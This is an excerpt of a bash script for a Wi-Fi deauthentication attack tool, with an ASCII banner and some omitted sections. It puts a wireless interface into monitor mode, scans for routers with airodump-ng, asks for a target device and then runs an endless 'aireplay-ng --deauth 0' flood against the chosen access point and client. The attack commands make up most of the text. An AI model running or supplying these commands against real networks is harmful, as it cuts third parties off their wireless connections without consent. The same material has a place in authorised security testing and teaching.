...
\ \   / /__  _ __  
 \ \ / / _ \| '_ \ 
  \ V / (_) | | | |
   \_/ \___/|_| |_|"
echo -e "\n"
echo -e $red"WARNING: DO NOT CLOSE DEAUTH2 TERMINAL!"
...
xterm -title "Select Target Router" -e 'echo "Please wait..."; ifconfig '$it' down; iwconfig '$it' mode monitor; ifconfig '$it' up; airodump-ng '$suc'; sleep 9999999999999999999;' &
# Details of Router
...
read device
xterm -title "DeauTH Attack Working" -e 'aireplay-ng --deauth 0 -c '$device' -a '$bssid' '$it &